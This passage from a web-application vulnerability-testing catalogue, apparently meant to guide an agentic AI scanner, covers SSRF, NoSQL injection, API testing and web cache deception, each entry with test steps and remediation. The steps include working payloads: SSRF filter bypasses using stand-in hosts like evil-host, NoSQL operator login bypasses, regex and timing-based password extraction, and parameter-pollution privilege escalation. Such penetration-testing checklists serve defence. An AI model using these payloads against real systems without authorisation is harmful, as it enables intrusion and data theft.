- Validate **before** writing to the permanent filesystem; stage in a sandboxed, non-executable temp location.
- Disable script execution in all user-writeable directories (no `AddType`/`AddHandler`, engine off) and block `.htaccess`/`web.config` uploads.
- **Re-encode** images/files via a clean library; strip active content.
- Serve uploads with `Content-Disposition: attachment` and `nosniff`.
- Prefer **an established framework** for managing uploads over hand-rolled validation.
- Apply size limits to prevent disk-fill DoS.

---

# CATEGORY D: SERVER-SIDE REQUEST FORGERY (SSRF)

## Background

SSRF lets an attacker cause the **server-side application to make HTTP requests to an unintended location** — internal-only services, back-end systems, or arbitrary external hosts. This can leak sensitive data (including authorization credentials), perform unauthorized actions, or reach administrative interfaces that trust "local" sources.

**Impact:** unauthorized actions/data access inside the organization (application or back-ends the app can reach); in some cases arbitrary command execution; onward attacks that appear to originate from the host's organization.

**Common patterns:** request parameters that contain full URLs (`stockApi=http://...`), partial URLs/hostnames, URLs inside parsed data formats (XML → XXE/SSRF), and the `Referer` header (analytics workers follow it).

**Attack classes:**

- SSRF against the server itself (loopback `127.0.0.1`/`localhost` — access controls may trust local traffic).
- SSRF against other back-end systems (non-routable private IPs with weak/no auth).
- Defender bypasses (blacklist filters, whitelist filters, open redirection).

---

### VUL-SSRF-0001 — Basic SSRF against the local server

**Severity:** High
**Status:** PENDING
**Category:** SSRF

**Description:** The application takes a user-supplied URL and fetches it server-side, reflecting the response to the user. Pointing it at the local machine (`127.0.0.1`, `localhost`) reaches the admin interface, which trusts requests originating from the local machine and bypasses access controls.

**Test Steps:**

1. Find parameters that drive server-side fetches (full URLs in request params: `stockApi`, `url`, `uri`, `path`, `next...`).
2. Submit `http://127.0.0.1/admin`, `http://localhost/admin`, and internal hostnames.
3. Compare response content to the public `/admin` — if admin functionality is returned, the local-trust bypass is confirmed.
4. Test alternative ports: `http://localhost:8080/...`, admin interfaces on non-standard ports.

**Remediation:**

- **Never trust requests merely because they originate from loopback** — enforce auth by identity/session, not source IP.
- Block/validate SSRF target inputs (see cross-cutting principles below).
- Remove disaster-recovery "local only, no login" admin shortcuts.

---

### VUL-SSRF-0002 — SSRF against other back-end systems

**Severity:** High
**Status:** PENDING
**Category:** SSRF

**Description:** The app reaches back-end systems the user cannot normally reach (private, non-routable IPs, often weak/no authentication) — e.g. `http://192.168.0.68/admin`.

**Test Steps:**

1. With a server-fetching parameter, sweep private ranges: `10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`, `169.254.169.254` (cloud metadata).
2. Try common internal hostnames and ports; access admin/management interfaces via the proxy.
3. If responses are reflected, harvest internal resources; verify sensitive functionality reachable without auth.

**Remediation:**

- Enforce network egress filtering at the application host; block requests to private/loopback/link-local/metadata ranges (or route through a validated proxy layer).
- Authenticate all internal/back-end endpoints independently — never rely on network obscurity.
- See cross-cutting SSRF controls below.

---

### VUL-SSRF-0003 — SSRF with blacklist-based input filter bypass

**Severity:** High
**Status:** PENDING
**Category:** SSRF

**Description:** Filters block `127.0.0.1`, `localhost`, `/admin`, etc. These blacklists are bypassable.

**Test Steps:** Try each technique and confirm the request reaches the internal target:

1. Alternative IP forms: `2130706433`, `017700000001` (octal), `127.1`, hex `0x7f000001`, IPv6 `::1`, `[::1]`.
2. Own domain resolving to loopback: `spoofed.<your-collaborator-domain>`.
3. URL encoding / double encoding: `%31%32%37...`, encoded `localhost`, case variation.
4. Redirect-based bypass: a URL you control returning a redirect (try different codes and protocol switches `http:` vs `https:`) to the target.

**Remediation:**

- Parse/normalize the URL with a strict, canonical parser, then validate the **final resolved IP/host** against an allowlist of permitted targets before connecting.
- Ban destination categories: loopback, private, link-local, metadata, and unknown-outbound hosts.
- Follow redirects only with re-validation at every hop.

---

### VUL-SSRF-0004 — SSRF with whitelist-based input filter bypass

**Severity:** High
**Status:** PENDING
**Category:** SSRF

**Description:** Filters require the URL to match an allowed prefix/host. Ad-hoc URL parsing can be abused.

**Test Steps:** Try each and confirm the final request lands on the target host:

1. Credentials-in-URL: `https://expected-host:fakepassword@evil-host`.
2. Fragment: `https://evil-host#expected-host`.
3. DNS hierarchy: `https://expected-host.evil-host` (you control `evil-host`).
4. URL-encoding / double-encoding to confuse the filter's parser vs the HTTP client's parser.
5. Combinations of the above.

**Remediation:**

- Match/canonicalize URLs with the SAME parser used for the actual fetch (single source of truth).
- Resolve DNS and validate the resulting IP against the allowlist; re-check after any redirects.
- Disallow userinfo (`@`), fragments, and encoded chars in server-side URLs unless needed — preferably reject outright.

---

### VUL-SSRF-0005 — SSRF via open redirection

**Severity:** Medium
**Status:** PENDING
**Category:** SSRF

**Description:** If the app strictly validates that the URL is on an allowed host but that host (or the app itself) has an open redirect, and the fetching client follows redirects, the attacker chains the redirect to reach internal targets.

**Test Steps:**

1. Find an open redirect in the allowed set: `.../nextProduct?currentProductId=6&path=http://evil-user.net` returning a redirect to `path`.
2. Build an SSRF payload: `stockApi=http://<allowed-host>/<open-redirect-endpoint>?path=http://<internal-target>`.
3. Confirm the fetch follows the redirect to the internal address and the response reflects.

**Remediation:**

- Fix open redirects (validate `path`/`next` against an allowlist; never reflect arbitrary redirect destinations).
- On the SSRF side, cap or forbid redirects, or re-validate each hop against the destination allowlist.

---

### VUL-SSRF-0006 — Blind SSRF (out-of-band detection)

**Severity:** Medium
**Status:** PENDING
**Category:** SSRF

**Description:** The app issues back-end requests to attacker-supplied URLs but the response is not returned to the attacker. Detection requires out-of-band (OAST) techniques, e.g. Burp Collaborator — monitor DNS/HTTP interactions from the target.

**Test Steps:**

1. Identify injectable server-fetch inputs (full URLs, partial hostnames, Referer header, URLs inside parsed XML/etc.).
2. Send a collaborator/collaborator-style domain in each candidate input.
3. Monitor for incoming DNS and HTTP interactions from the target host. A DNS hit without HTTP is common (network egress blocking) but still evidence of a fetch attempt.
4. If confirmed, probe internal systems blind with well-known vulnerability payloads that also phone home out-of-band (e.g. Shellshock-style payloads, known CVEs) — may yield RCE on unpatched internal servers.

**Remediation:**

- Apply the same destination allowlisting/egress controls as for reflected SSRF.
- Restrict server-side fetch capability to a minimal set of routes/hosts; drop `Referer`driven fetching.
- Keep all internal systems patched and independent — blind SSRF probes must not succeed against them.

---

## SSRF — General Remediation Principles (cross-cutting)

- Accept server-side fetch targets only through an **explicit allowlist** (scheme + host) enforced against the **resolved IP** after parsing with one canonical URL parser.
- Block loopback (`127.0.0.0/8`, `::1`), private/LAN, link-local (`169.254.169.254`), and non-routable ranges + metadata endpoint.
- Disallow userinfo (`@`), fragments, arbitrary encodings; re-validate after every redirect hop (or forbid redirects).
- Perform egress filtering/firewalling on the application host regardless of application-level controls.
- Reduce feature surface: avoid fetching arbitrary URLs (especially from `Referer` or data formats); if XML parsing is needed, disable external entities (XXE — see related notes).

---

# CATEGORY E: NOSQL INJECTION

## Background

NoSQL injection lets an attacker interfere with queries the app makes to a **NoSQL database** (e.g. MongoDB). Impact: bypass authentication/protection, extract or edit data, denial of service, or code execution on the server.

Two types:

- **Syntax injection** — break the NoSQL query syntax to inject payloads (methodology similar to SQLi, but query languages vary per DB).
- **Operator injection** — abuse NoSQL query operators (`$where`, `$ne`, `$in`, `$regex`, `$gt`, ...) to manipulate the query.

**Key MongoDB operators:** `$where` (matches docs satisfying a JS expression — can run JavaScript), `$ne` (not equal), `$in` (in array), `$regex` (regex match).

---

### VUL-NOSQL-0001 — NoSQL syntax injection

**Severity:** High
**Status:** PENDING
**Category:** NoSQL Injection

**Description:** User input is concatenated into NoSQL queries unsanitized. Break the query syntax to inject payload affecting query logic — including overriding existing conditions (e.g. `'||'1'=='1` returns all records; a `\u0000` null byte can cause MongoDB to ignore trailing conditions).

**Test Steps:**

1. Submit a fuzz string in each input: `'"`{`\n;$Foo}\n$Foo \xYZ` (URL-encoded). A changed response vs baseline hints at weak filtering.
2. Inject a lone `'` → if behavior changes (syntax error) and escaping the quote (`\'`) restores normal behavior, injection exists.
3. Test conditional behavior: `' && 0 && 'x` (false) vs `' && 1 && 'x` (true) — differing responses confirm boolean influence.
4. Override conditions: `category=fizzy'||'1'=='1` → all records returned.
5. Null-byte condition bypass: `category=fizzy'%00` → trailing `this.released == 1` is ignored (MongoDB ignores chars after null).
6. CRITICAL CARE: constantly-true injections reused in update/delete queries can corrupt data — test read-only endpoints first, only on disposable data.

**Remediation:**

- Sanitize/validate input against an **allowlist of accepted characters**.
- Use **parameterized/typed queries** — never concatenate raw input into the query.
- Review all queries that reuse request data (update/delete paths must be parameterized too).

---

### VUL-NOSQL-0002 — NoSQL operator injection (auth bypass)

**Severity:** Critical
**Status:** PENDING
**Category:** NoSQL Injection

**Description:** The app builds queries that accept nested operators. Injecting operators into inputs (`username`, `password`) changes the query into one that matches any/all users — bypassing authentication.

**Test Steps:**

1. Submit operators as nested objects in JSON bodies: `{"username":{"$ne":"invalid"}}`.
2. For URL-based inputs use bracket syntax: `username[$ne]=invalid`. If ignored, try: convert GET→POST, switch `Content-Type` to `application/json`, add JSON body, inject operators there.
3. Auth bypass: `{"username":{"$ne":"invalid"},"password":{"$ne":"invalid"}}` → logs in as the first user in the collection.
4. Target accounts: `{"username":{"$in":["admin","administrator","superadmin"]},"password":{"$ne":""}}`.
5. Confirm whether operator processing also affects other fields (prices, roles, IDs).

**Remediation:**

- Apply an **allowlist of accepted keys** at the query layer — reject operator/`$`prefixed keys in user-controlled objects.
- Use typed parameterized query builders; never accept raw object maps from clients.
- Validate that provided values are of the expected simple type (reject objects where scalars are expected).

---

### VUL-NOSQL-0003 — NoSQL injection to extract data

**Severity:** High
**Status:** PENDING
**Category:** NoSQL Injection

**Description:** When queries use JavaScript-capable operators/functions (`$where`, `mapReduce`), injected JS can read database fields character-by-character. Even without JS execution, operators like `$regex` exfiltrate data one character at a time via true/false responses.

**Test Steps:**

1. If `$where` is used: `...?username=admin' && this.password[0] == 'a' || 'a'=='b` — boolean oracle on password characters. Also `this.password.match(/\d/)` to test content classes.
2. Identify field names by comparing responses: `admin' && this.username!='`  (exists) vs `admin' && this.foo!='`  (doesn't) — or dictionary attack, or `Object.keys(this)[0].match('^.{0}a.*')` via injected `$where`.
3. If the query lacks JS operators, inject one: add `"$where":"1"` vs `"$where":"0"`; differing responses = JS evaluated.
4. Operator-only exfiltration: `{"username":"admin","password":{"$regex":"^a.*"}}` — differing responses reveal the correct prefix char by char.

**Remediation:**

- Prevent `$where`/`mapReduce`/JavaScript in queries (block those operators entirely).
- Parameterize queries; apply key allowlists so operators can't be injected.
- Apply least-privilege DB access so even a successful query can't reach sensitive collections.

---

### VUL-NOSQL-0004 — Timing-based NoSQL injection

**Severity:** Medium
**Status:** PENDING
**Category:** NoSQL Injection

**Description:** When responses don't visibly differ, trigger conditional time delays via JavaScript injection to detect and exploit injection (boolean/timing oracle — works where error-based detection fails).

**Test Steps:**

1. Load the page several times to establish a baseline response time.
2. Inject a delay payload: `{"$where": "sleep(5000)"}` — observe a ~5s delay if injection works.
3. Conditional delay for extraction: `admin'+function(x){var waitTill = new Date(new Date().getTime() + 5000);while((x.password[0]==="a") && waitTill > new Date()){};}(this)+'` — delays only when the password's first char is `a`.
4. Confirm char-by-char extraction of secret fields.

**Remediation:**

- Same as VUL-NOSQL-0003: block JS operators, parameterize, key allowlists.
- Apply query timeouts and resource limits to blunt timing-based attacks.

---

## NoSQL Injection — General Remediation Principles (cross-cutting)

- **Sanitize and validate** user input with an allowlist of accepted characters.
- **Parameterize queries** — never concatenate user input directly into the query.
- **Allowlist accepted keys** to prevent operator injection (`$`prefixed keys, nested objects).
- Treat rapidly-typed languages (JS in `$where`) as high-risk: disable unless essential.
- Consult the specific NoSQL vendor's security documentation; enforce least-privilege database access.

---

# CATEGORY ROADMAP — FULL PRODUCT COVERAGE

All categories below are **fully populated** from `vuln.txt` (Section 5), each entry has remediation guidance derived from `remediation.txt`, and every entry is represented in the **Status Dashboard (Section 3)**. This roadmap tracks coverage lineage so the agentic AI can trace any vulnerability back to its source content.

| Cat | Category | Prefix | Source reference | Entry Status |
| --- | --- | --- | --- | --- |
| A | Authentication | `VUL-AUTH-####` | vuln.txt §Authentication | Populated (VUL-AUTH-0001–0014) |
| B | Business Logic | `VUL-BL-####` | vuln.txt §Business logic | Populated (VUL-BL-0001–0008) |
| C | File Upload | `VUL-FU-####` | vuln.txt §File upload | Populated (VUL-FU-0001–0010) |
| D | SSRF | `VUL-SSRF-####` | vuln.txt §SSRF | Populated (VUL-SSRF-0001–0006) |
| E | NoSQL Injection | `VUL-NOSQL-####` | vuln.txt §NoSQL injection | Populated (VUL-NOSQL-0001–0004) |
| F | API Testing | `VUL-API-####` | vuln.txt §API testing | Populated (VUL-API-0001–0008) |
| G | Web Cache Deception | `VUL-WCD-####` | vuln.txt §Web cache deception | Populated (VUL-WCD-0001–0006) |
| H | Cross-Site Scripting (XSS) | `VUL-XSS-####` | vuln.txt §Cross-site scripting | Populated (VUL-XSS-0001–0011) |
| I | CSRF | `VUL-CSRF-####` | vuln.txt §CSRF | Populated (VUL-CSRF-0001–0008) |
| J | CORS | `VUL-CORS-####` | vuln.txt §CORS | Populated (VUL-CORS-0001–0005) |
| K | Clickjacking | `VUL-CJK-####` | vuln.txt §Clickjacking | Populated (VUL-CJK-0001–0005) |
| L | DOM-Based Vulnerabilities | `VUL-DOM-####` | vuln.txt §DOM-based | Populated (VUL-DOM-0001–0015) |
| M | WebSockets | `VUL-WS-####` | vuln.txt §WebSockets | Populated (VUL-WS-0001–0004) |
| N | HTTP Host Header Attacks | `VUL-HOST-####` | vuln.txt §HTTP Host header | Populated (VUL-HOST-0001–0008) |
| O | OAuth Authentication | `VUL-OAUTH-####` | vuln.txt §OAuth | Populated (VUL-OAUTH-0001–0009) |
| P | JWT Attacks | `VUL-JWT-####` | vuln.txt §JWT attacks | Populated (VUL-JWT-0001–0008) |
| Q | Web LLM Attacks | `VUL-LLM-####` | vuln.txt §Websockets/LLM (bonus topic) | Populated (VUL-LLM-0001–0005) |
| R | AI-Powered Scanner / Agent | `VUL-AI-####` | vuln.txt §Websockets/AI (bonus topic) | Populated (VUL-AI-0001–0003) |

# CATEGORY F: API TESTING VULNERABILITIES (REST / JSON APIs)

## Background

APIs enable software systems and applications to communicate and share data. Classic web vulnerabilities (SQLi, XSS…) are API tests by another name; this category focuses on RESTful and JSON APIs that are **not fully used by the website front-end**, plus **server-side parameter pollution** (SSP) affecting internal APIs.

**Attack surface to map (API recon):**

- API endpoints (e.g. `GET /api/books`, `/api/books/mystery`) and their base paths.
- Input data processed (compulsory + optional parameters).
- Types of requests accepted (HTTP methods, media formats).
- Rate limits and authentication mechanisms.
- API documentation — human-readable and machine-readable (OpenAPI/Swagger).

**Prevention (from vuln.txt §API):** secure documentation unless publicly intended; keep docs up to date; allowlist permitted HTTP methods; validate expected content types; use generic error messages; protect ALL API versions; for mass assignment, allowlist updatable properties and blocklist sensitive ones; for SSP, encode all user input before it is embedded in a server-side request and enforce expected format/structure.

---

### VUL-API-0001 — Exposed API documentation / attack-surface disclosure

**Severity:** Medium
**Status:** PENDING
**Category:** API Testing

**Description:** API documentation (human- or machine-readable) is publicly accessible, revealing endpoints, parameters, schemas, and sometimes internal structure. Unintended exposure greatly speeds up exploitation and pre-validated attacks against undocumented functionality.

**Test Steps:**

1. Browse/crawl the application for documentation endpoints: `/api`, `/swagger/index.html`, `/openapi.json`, plus OpenAPI/Swagger JSON/YAML variants.
2. If you find a resource endpoint (e.g. `/api/swagger/v1/users/123`), investigate its base path: `/api/swagger/v1`, `/api/swagger`, `/api`.
3. Use a wordlist of common documentation paths with an intruder-style tool.
4. Parse any machine-readable documentation (OpenAPI) and enumerate all documented endpoints.

**Key observations to record:** which docs are reachable without auth, what endpoints/parameters they disclose.

**Remediation:**

- Secure documentation if the API is not intended to be publicly accessible.
- Keep documentation up to date so legitimate testers see the full attack surface (and outdated docs are not misleading).
- Use generic error messages to avoid leaking internal details; protect all versions of the API, not just production.

---

### VUL-API-0002 — Hidden / undocumented / unused API endpoints

**Severity:** High
**Status:** PENDING
**Category:** API Testing

**Description:** The API exposes endpoints not reachable via the web UI (hidden, deprecated, or test endpoints). These often lack the hardening applied to documented functionality and can expose sensitive data or dangerous operations.

**Test Steps:**

1. Crawl the application and look for `/api/` patterns in URLs and JavaScript files (manual review or JS link extraction).
2. From one known endpoint (e.g. `PUT /api/user/update`), use an intruder wordlist of common operations (`delete`, `add`, `list`, `admin`…) at the same path position to discover siblings.
3. Investigate base paths of every identified resource endpoint.
4. Test discovered endpoints across all HTTP methods (see VUL-API-0003).

**Key observations to record:** endpoints found that are unused by the UI; objects they can read/modify; auth requirements.

**Remediation:**

- Apply protective measures (auth, rate limiting, validation) to ALL versions and endpoints, including hidden/unused ones.
- Remove or deactivate unused/deprecated endpoints.
- Apply an allowlist of permitted HTTP methods.

---

### VUL-API-0003 — Unrestricted HTTP methods on API endpoints

**Severity:** Medium
**Status:** PENDING
**Category:** API Testing

**Description:** Endpoints accept methods the developer never intended (e.g. `DELETE /api/tasks/1`, `PATCH` where only `GET` was expected), opening up unintended functionality and attack surface.

**Test Steps:**

1. Cycle common methods (`GET`, `POST`, `PUT`, `PATCH`, `DELETE`, `OPTIONS`) against each endpoint using an HTTP-verbs intruder list.
2. Observe which methods are accepted and what each returns (HTTP 200 vs 405, error details).
3. Verify dangerous methods on low-priority objects first to avoid altering critical data.

**Key observations to record:** method → status → response differences per endpoint.

**Remediation:**

- Enforce an allowlist of permitted HTTP methods per endpoint.
- Use generic error responses so probes don't reveal internal details.

---

### VUL-API-0004 — Content-type confusion (JSON ↔ XML processing differences)

**Severity:** Medium
**Status:** PENDING
**Category:** API Testing

**Description:** APIs often behave differently based on `Content-Type`. Changing the content type can trigger errors that disclose information, bypass flawed input defenses, or reach an XML parsing path with its own injection bugs (e.g. XInclude/XXE) even when the JSON path is secure.

**Test Steps:**

1. Modify the `Content-Type` header and reformat the body accordingly (e.g. JSON → XML) using an auto-converter.
2. Compare responses for differences in logic, validation, or error output.
3. Attempt injection payloads against the alternate parser (e.g. XML entity / XInclude payloads).

**Key observations to record:** error disclosures from different content types; parser-specific behavior.

**Remediation:**

- Validate that the content type is as expected for each request/response.
- Apply the same validation rules regardless of format; harden all parsers (e.g. disable external entities in XML).

---

### VUL-API-0005 — Mass assignment (auto-binding hidden fields)

**Severity:** Critical
**Status:** PENDING
**Category:** API Testing

**Description:** Frameworks auto-bind request parameters/fields to internal object properties. Hidden fields (e.g. `id`, `isAdmin`, `role`, `price`) become writable even though the UI never exposes them, enabling privilege escalation or data tampering.

**Test Steps:**

1. Make a `GET` request that returns the object (e.g. `GET /api/users/123`) and note fields returned along with editable ones (e.g. `id`, `isAdmin`).
2. Add a hidden field to an update request (e.g. `PATCH /api/users/` with `"isAdmin": true`).
3. Also send an invalid value (e.g. `"isAdmin": "foo"`) — if behavior differs from the valid-but-false value, the field is being bound and processed.
4. Confirm escalation by browsing the application as the modified user (can you reach admin functionality?).

**Key observations to record:** object fields returned by GET; acceptance of extra update fields; privilege change after update.

**Remediation:**

- Allowlist the properties a user may update; blocklist sensitive properties (`isAdmin`, `role`, `id`, `price`…).
- Never auto-bind client input to server objects without explicit mapping; validate inputs strictly (types, ranges).

---

### VUL-API-0006 — Server-side parameter pollution in the query string

**Severity:** High
**Status:** PENDING
**Category:** API Testing

**Description:** User input is embedded into a server-side request to an internal API without adequate encoding. Query-syntax characters (`#`, `&`, `=`) in the input can truncate the query, inject new parameters, or override existing ones — bypassing server-side logic (e.g. `publicProfile=true`) and accessing unauthorized data.

**Test Steps:**

1. Find inputs mirrored into server-side requests (query params, form fields, headers, path params).
2. **Truncation:** send `%23` (URL-encoded `#`) plus a marker, e.g. `name=peter%23foo`; if the server-side request becomes `?name=peter#foo&publicProfile=true`, the query was truncated.
3. **Invalid parameter injection:** send `%26` (encoded `&`), e.g. `name=peter%26foo=xyz`; observe how the extra parameter is parsed.
4. **Valid parameter injection:** once you can modify the query string, inject a real hidden parameter (e.g. `%26email=foo`, `name=peter%26email=foo`).
5. **Override existing parameter:** inject a second copy of the original name, e.g. `name=peter%26name=carlos`. Note parser semantics — PHP uses the last parameter, ASP.NET combines both, Node/Express uses the first.
6. If override works, inject privileged values (e.g. `name=administrator`) to elevate access.

**Key observations to record:** truncation vs injection evidence; which framework semantics apply; whether `publicProfile=true` can be removed/overridden.

**Remediation:**

- Use an allowlist of characters that do not need encoding; encode ALL other user input before embedding in a server-side request.
- Validate input to adhere to the expected format and structure (reject query-syntax characters where a plain value is expected).

---

### VUL-API-0007 — Server-side parameter pollution in REST URL paths

**Severity:** High
**Status:** PENDING
**Category:** API Testing

**Description:** A RESTful API places parameter names/values in the URL path (`/api/users/123`). If user input is used to build the path and the back-end normalizes it, path-traversal sequences can redirect the internal request to a different resource (e.g. `/api/private/users/admin`).

**Test Steps:**

1. Identify input that maps to a path segment of a server-side request.
2. Send a URL-encoded traversal value, e.g. `name=peter%2f..%2fadmin` (server request becomes `/api/private/users/peter/../admin`).
3. Observe whether the server-side client/back-end normalizes the path and returns the target resource (e.g. the `admin` user).

**Key observations to record:** normalized target returned; cross-resource access.

**Remediation:**

- Reject traversal sequences and encoded slashes in inputs used to build server-side URL paths.
- Encode user input and validate expected structure before construction of internal requests; enforce access controls at the internal API layer (never trust path normalization).

---

### VUL-API-0008 — Server-side parameter pollution in structured data formats (JSON/XML)

**Severity:** High
**Status:** PENDING
**Category:** API Testing

**Description:** User input is embedded into server-side JSON/XML without adequate encoding, allowing the injection of additional fields/structures (e.g. adding `"access_level":"administrator"` to an update payload) or second-order injection in responses.

**Test Steps:**

1. Find an input that is forwarded to an internal API in a JSON/XML body (e.g. `name=peter` → `PATCH /users/7312/update {"name":"peter"}`).
2. Plain injection: send `name=peter","access_level":"administrator` and check whether the server-side request becomes `{"name":"peter","access_level":"administrator"}`.
3. JSON-input case: `{"name": "peter\",\"access_level\":\"administrator"}`.
4. Check whether a privileged field you inject (e.g. `access_level`) changes your permissions.
5. Also probe structured-format injection in *responses* (stored input embedded in a back-end JSON response without encoding).
6. For XML back-ends, test XInclude/entity payloads.

**Key observations to record:** whether injected fields survive into the server-side object; field values accepted (e.g. `administrator`).

**Remediation:**

- Encode user input before embedding in structured formats; validate that all input adheres to the expected schema/structure.
- Allowlist fields the user is permitted to set (see VUL-API-0005) and enforce at the internal API.

---

## API Testing — General Remediation Principles (cross-cutting)

- Security is a design-time concern: secure documentation, keep docs up to date, allowlist HTTP methods, validate content types, use generic error messages, protect ALL API versions.
- Prevent mass assignment with allowlist/blocklist of bound properties.
- Prevent server-side parameter pollution: allowlist of harmless characters, encode everything else, strict format/structure validation, and enforce access controls at the internal/back-end API layer (never rely on network isolation or normalization).
- Apply standard input validation, auth, and rate limiting to every endpoint, including hidden ones.

---

# CATEGORY G: WEB CACHE DECEPTION

## Background

Web cache deception lets an attacker **trick a web cache into storing sensitive, dynamic content**. The attacker persuades a victim to visit a malicious URL; the victim's browser makes an *ambiguous* request for sensitive content; the cache misinterprets it as a request for a **static resource** (based on mismatch rules) and stores the response; the attacker then requests the same URL and retrieves the victim's private data.

**Distinguish from web cache poisoning:** poisoning manipulates *cache keys* to inject malicious content served to other users; deception stores a *legitimate* (but private) response and steals it via the cache.

**Cache rules:** static file extension rules (`.css`, `.js`, `.ico`, `.exe`…) · static directory rules (`/static`, `/assets`, `/scripts`, `/images`) · exact-match / filename rules.
**Cache key:** typically URL path + query params (plus headers in some caches). When testing, change the cache key on every request (add a dynamic cachebuster query string) or you may be served stale cached responses.

---

### VUL-WCD-0001 — Web cache deception via static extension cache rules

**Severity:** High
**Status:** PENDING
**Category:** Web Cache Deception

**Description:** The cache caches anything whose URL ends in a static extension. If the origin server ignores the added path segment, a request like `/api/orders/123/foo.js` is processed as the sensitive API response but cached as a "static" resource.

**Test Steps:**

1. Identify a sensitive dynamic endpoint (e.g. `/api/orders/123`, `/account`, admin-only data).
2. Add an arbitrary path segment, then a static extension, e.g. `/api/orders/123/foo.js`; if the origin still returns the sensitive data, path mapping is lax.
3. Confirm the response is cached (repeat the exact request → expect a cache hit) and contains the private data.
4. Try a range of extensions: `.css`, `.ico`, `.exe`, `.js`.
5. Use a dynamic cachebuster (unique query string per request) so responses are not polluted by earlier cached copies; compare poC under two authenticated users to prove cross-user disclosure.

**Key observations to record:** extension(s) that pass caching; sensitive fields visible in the cached response.

**Remediation:**

- Mark all dynamic resources with `Cache-Control: no-store, private`.
- Configure CDN caching rules so they do not override `Cache-Control`.
- Enable CDN protection that verifies the response `Content-Type` matches the request URL extension (e.g. Cloudflare Cache Deception Armor).
- Verify no discrepancies exist between origin-server and cache URL interpretation.

---

### VUL-WCD-0002 — Web cache deception via path mapping / delimiter discrepancies

**Severity:** High
**Status:** PENDING
**Category:** Web Cache Deception

**Description:** The cache and origin server disagree on how URL paths map to resources or which characters are delimiters (e.g. `;`). A delimiter used by the origin but not the cache lets you append a static extension visible only to the cache.

**Test Steps:**

1. Test origin mapping: add an arbitrary path segment to a vulnerable endpoint (`/profile` → `/profile/foo`); if sensitive data still returned, the origin ignores the segment.
2. Test cache mapping: add a static extension (`/profile/foo.js`) and check for caching of the sensitive response.
3. Identify a delimiter used by the origin but not the cache (e.g. `;`): payload `/settings/users/list;aaa.js` — origin serves user-list data while the cache hashes the full path with `.js`.
4. Use cachebusters and confirm cross-user disclosure of the private response.

**Key observations to record:** delimiters honored by each component; path segment that yields both caching and sensitive data.

**Remediation:**

- Same as VUL-WCD-0001 (Cache-Control, CDN configuration, Content-Type check, alignment of path parsing between origin and cache).

---

### VUL-WCD-0003 — Web cache deception via encoded delimiter decoding discrepancies

**Severity:** High
**Status:** PENDING
**Category:** Web Cache Deception

**Description:** Caches often URL-decode and rewrite paths before caching. Encoding a delimiter (e.g. `%3f` for `?`) makes the cache apply a static-extension rule to the *encoded* path (`/myaccount%3fwcd.css`) while the origin decodes it to `?wcd.css` and serves the dynamic `/myaccount` page — which then gets cached.

**Test Steps:**

1. Test how the cache reacts to encoded delimiters: try `%3f` (`?`), `%2f` (`/`), `%23` (`#`) appended with a static extension to a sensitive endpoint.
2. Confirm the origin still returns the sensitive content and the cache stores it (repeat request = cache hit containing private data).
3. Try full encoding of the `?` (`%3f`) and other delimiter characters with different static extensions.

**Key observations to record:** encoded characters that produce a cache/store mismatch; sensitive data visible on cache hit.

**Remediation:**

- Same as VUL-WCD-0001; additionally, ensure cache and origin decode/parse delimiters identically (no decode discrepancy).

---

### VUL-WCD-0004 — Web cache deception via static-directory rules / origin-server normalization

**Severity:** High
**Status:** PENDING
**Category:** Web Cache Deception

**Description:** Cache rules targeting static directory prefixes (`/static`, `/assets`, `/scripts`, `/images`) can be abused with path traversal if the origin server decodes slashes and resolves dot-segments but the cache does not. E.g. `/static/..%2fprofile` — origin normalizes to `/profile` (private data), cache treats it as `/static/...` and caches it.

**Test Steps:**

1. Detect origin normalization: send a POST/non-cacheable request with a traversal sequence, e.g. `/aaa/..%2fprofile`; if the origin still returns profile data, it normalizes.
2. Identify static directory prefixes: review cache-hit history for `/static`, `/assets`, etc.
3. Test cache behavior: request `/assets/..%2fprofile` (encode only the second slash in the dot-segment) and check whether the sensitive response is cached.
4. Exploit: `/static/..%2fprofile` (origin → `/profile`, sensitive data; cache → static rule → cached for attacker).

**Key observations to record:** static prefix that matches a cache rule; traversal sequence that survives to the origin.

**Remediation:**

- Same as VUL-WCD-0001; ensure no path-normalization discrepancy between origin and cache (origin should not silently ignore or resolve segments the cache hashes).

---

### VUL-WCD-0005 — Web cache deception via cache-server normalization

**Severity:** High
**Status:** PENDING
**Category:** Web Cache Deception

**Description:** When the **cache** decodes slashes and resolves dot-segments (normalizing the path) but the origin does not, a fully-encoded traversal sequence (e.g. `/profile%2f%2e%2e%2findex.html`) is normalized by the cache to a static filename (`/index.html`) and cached — while the origin serves `/profile`.

**Test Steps:**

1. Detect cache normalization: request `/profile%2f%2e%2e%2findex.html`; if the response is cached as `/index.html`, the cache normalizes.
2. Encode **all** characters of the traversal sequence (no unencoded slashes) to avoid browser resolution.
3. Exploit by replacing the static directory prefix with a static filename rule.

**Key observations to record:** cache-normalized path vs origin-served path; cacheable filename.

**Remediation:**

- Same as VUL-WCD-0001; eliminate cache-side dot-segment resolution discrepancies via aligned normalization/`Cache-Control`.

---

### VUL-WCD-0006 — Web cache deception via exact-match filename / normalization discrepancy

**Severity:** High
**Status:** PENDING
**Category:** Web Cache Deception

**Description:** Cache rules that match an exact filename (e.g. only cache when the request maps to a specific file) can be abused when the cache resolves encoded dot-segments but the origin server doesn't, so the same URL is a "known file" to the cache yet a dynamic page to the origin.

**Test Steps:**

1. Detect cache normalization as in VUL-WCD-0005 (request with encoded traversal to a filename, e.g. `/profile%2f%2e%2e%2findex.html`, and check for a cache hit).
2. Confirm the origin serves the sensitive page regardless of the appended filename.
3. Exploit the exact-match rule so the sensitive response gets cached and is retrievable by the attacker.

**Key observations to record:** filename that satisfies the exact-match cache rule while the origin still returns dynamic content.

**Remediation:**

- Same as VUL-WCD-0001; never cache responses lacking explicit `Cache-Control` — prefer `no-store, private` on all dynamic resources.

---

## Web Cache Deception — General Remediation Principles (cross-cutting)

- Always mark dynamic resources with `Cache-Control: no-store, private`.
- Configure CDN settings so caching rules never override the `Cache-Control` header.
- Activate CDN anti-deception protections that verify the response `Content-Type` matches the request's URL file extension.
- Verify there are no discrepancies between how the origin server and the cache interpret URL paths (mapping, delimiters, decoding, dot-segment normalization).
- Test with dynamic cachebusters to avoid stale-cache artifacts.

---

# CATEGORY H: CROSS-SITE SCRIPTING (XSS)

## Background

